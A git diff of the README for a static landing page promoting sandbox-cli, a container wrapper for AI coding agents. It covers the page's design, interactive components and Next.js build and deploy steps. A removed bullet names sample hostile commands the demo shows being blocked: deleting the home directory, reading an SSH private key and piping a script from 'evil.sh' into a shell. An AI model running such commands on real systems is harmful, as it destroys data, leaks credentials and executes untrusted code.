@@ -1,76 +1,71 @@
 # web/ — sandbox-cli landing page
 
-A static landing page for **sandbox-cli**: what it is, why it makes agent
-autonomy safe, how to use it, and how it compares to the alternatives.
+Next.js 16 + TypeScript + Tailwind 4 + shadcn/ui. Builds to a **fully static
+export**, so it still deploys to GitHub Pages or any bucket with no Node server.
 
 ## Design direction — "the containment boundary"
 
 The product *is* a wall between your host and an agent, so the page is built
-around that wall rather than around a generic feature grid:
+around that wall rather than around a generic feature grid.
 
-- **The hero is an interactive demo.** Fire real commands (`rm -rf ~`,
-  `cat ~/.ssh/id_rsa`, `curl evil.sh | sh`, `npm test`) at the boundary and watch
-  where each one lands — attacks bounce off the wall, workspace work passes
-  through. It autoplays once on scroll, then hands over to the visitor.
-- **Colour is semantic, not decorative.** Warm coral = *exposed* (host side),
-  cool teal = *contained* (sandbox side). The same pair drives the comparison
-  table, the threat panels and the verdict log, so the palette restates the
-  product's thesis everywhere it appears.
-- **shadcn/ui token architecture**, re-skinned: the familiar
-  `--background` / `--card` / `--muted` / `--border` / `--radius` variable
-  contract, with cool-biased neutrals instead of default grey.
+- **Colour is semantic.** Warm coral = *exposed* (host side), cool teal =
+  *contained* (sandbox side). The same pair drives the simulator, the threat
+  panels, the comparison table and the radar chart, so the palette restates the
+  product's thesis wherever it appears. Both are exposed as Tailwind colours
+  (`text-exposed`, `bg-contained-soft`, …) via `@theme inline`.
 - **Type has three roles** — Bricolage Grotesque (display), IBM Plex Sans (body),
   IBM Plex Mono (the terminal voice, used heavily since the subject is a CLI).
-- **Light + dark**, following the OS by default with a persistent toggle, and a
-  no-flash inline script that sets the theme before first paint.
-- Responsive; respects `prefers-reduced-motion` (the demo skips straight to its
-  verdict instead of animating).
+  Loaded through `next/font`, so they self-host with no external request.
+- **shadcn/ui token contract** (`--background`, `--card`, `--muted`, `--border`,
+  `--radius`) with cool-biased neutrals instead of default grey.
+- **Light + dark** via `next-themes`, following the OS by default.
+- Respects `prefers-reduced-motion` throughout — the simulator resolves straight
+  to its verdict instead of animating.
 
-## Files
+## The interactive pieces
 
-| File | Purpose |
+| Component | What it does |
 |---|---|
-| `index.html` | The page. Semantic, accessible markup. |
-| `styles.css` | Design tokens + component styles for both themes. |
-| `main.js`   | Containment demo, theme toggle, tabs, copy buttons, mobile menu, reveals. |
+| `containment-canvas.tsx` | The centrepiece. A `<canvas>` particle system: commands launch from the host side, blocked ones **shatter** against the wall with 30 physics-driven shards, allowed ones pass through into `/workspace`. Ambient motes drift on the exposed side. DPI-aware, theme-aware (reads CSS custom properties each frame). |
+| `containment-simulator.tsx` | Wraps the canvas with preset buttons, a **free-text prompt** (type any command and it is classified for real), and a verdict log. Autoplays once on scroll, then hands over to the visitor. |
+| `blast-radius.tsx` | One switch flips the host filesystem between `reachable` and `not mounted`, with only the project staying lit. |
+| `dry-run-builder.tsx` | Toggle real sandbox flags (`--worktree`, `--allow`, `--no-persist-auth`, `--root`) and watch the actual `docker` argv assemble line by line, animated in and out. |
+| `attack-surface-chart.tsx` | Recharts radar over six axes, all "higher is better". Series toggle so the shapes stay comparable. |
+| `agent-explorer.tsx` | All fifteen adapters; pick one for its real install route, forwarded env vars and per-agent gotcha. |
 
-No build step and no framework. The only external request is the Google Fonts
-stylesheet; if it fails the page falls back to system sans/mono and still reads
-correctly.
+## Where the content comes from
 
-## Preview locally
+Copy and data mirror the repo — `README.md`, `CLAUDE.md` and
+`docs/proposals/agent-adapters.md`. The typed data lives in:
+
+- `src/lib/agents.ts` — the fifteen adapters, install routes, forwarded env
+- `src/lib/commands.ts` — the boundary classifier (8 rules) and presets
+- `src/lib/comparison.ts` — spec-table rows and radar scores
+
+If the CLI's behaviour changes, update those three files and the page follows.
+
+## Develop
 
 ```sh
-# Python (built-in)
-cd web && python3 -m http.server 8000
-# → http://localhost:8000
-
-# or Node
-npx serve web
-
-# or inside sandbox-cli itself
-sandbox-cli run -- python3 -m http.server 8000
+cd web
+npm install
+npm run dev     # http://localhost:3000
+npm run lint
+npm run build   # static export -> web/out
 ```
 
 ## Deploy
 
-Point any static host at this directory (`web/` as the publish root):
+`npm run build` writes a static site to `web/out`.
 
-- **GitHub Pages** — set the Pages source to `/web` on `main`, or push the folder
-  to a `gh-pages` branch.
-- **Netlify / Vercel / Cloudflare Pages** — publish directory `web`, build
-  command *(none)*.
-- **Any bucket / CDN** — upload the files as-is.
+- **GitHub Pages** — publish `web/out` (via an action, or push it to `gh-pages`).
+  Set `basePath` in `next.config.ts` if serving from a subpath.
+- **Netlify / Vercel / Cloudflare Pages** — build command `npm run build`,
+  publish directory `web/out`.
+- **Any bucket / CDN** — upload `web/out` as-is.
 
-## Editing notes
+## Notes
 
-- Colours are CSS custom properties in `styles.css` (`:root` light, `.dark`
-  dark). `--contained` and `--exposed` are the semantic pair; changing them
-  re-skins the whole page including the demo.
-- The demo's verdicts live in the `VERDICTS` map in `main.js`. Each `.shot`
-  button's `data-target` must match a key there and a `data-path` node in the
-  stage — add all three together.
-- Copy mirrors the repo: the isolation model, the 15 wrapped agents and the
-  install command all come from `README.md`, `CLAUDE.md` and `docs/`. If those
-  change, update the page to match.
-- Icons are inline SVG — no icon font, no sprite sheet.
+- `output: "export"` means no server features (no route handlers, no ISR,
+  `images.unoptimized` is on). That is deliberate — the page is a brochure.
+- The repo's Go toolchain is untouched; `make test` and friends never look here.
